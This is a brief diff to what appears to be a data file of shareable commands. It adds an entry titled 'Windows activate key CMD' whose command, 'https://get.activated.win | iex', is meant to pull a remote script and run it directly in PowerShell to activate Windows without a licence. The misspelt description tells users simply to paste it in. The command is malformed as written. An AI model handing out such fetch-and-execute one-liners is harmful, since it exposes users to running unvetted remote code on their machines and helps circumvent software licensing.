@@ -495,8 +495,8 @@
             },
             {
                 id: 5,
-                title: "",
-                command: "Windows activate key CMD",
+                title: "Windows activate key CMD",
+                command: "https://get.activated.win | iex",
                 description: "Only need to past this CMD in you powershall",
                 category: "NETWORK",
                 url: "https://www.youtube.com/watch?v=HbN3fkjc3FY"
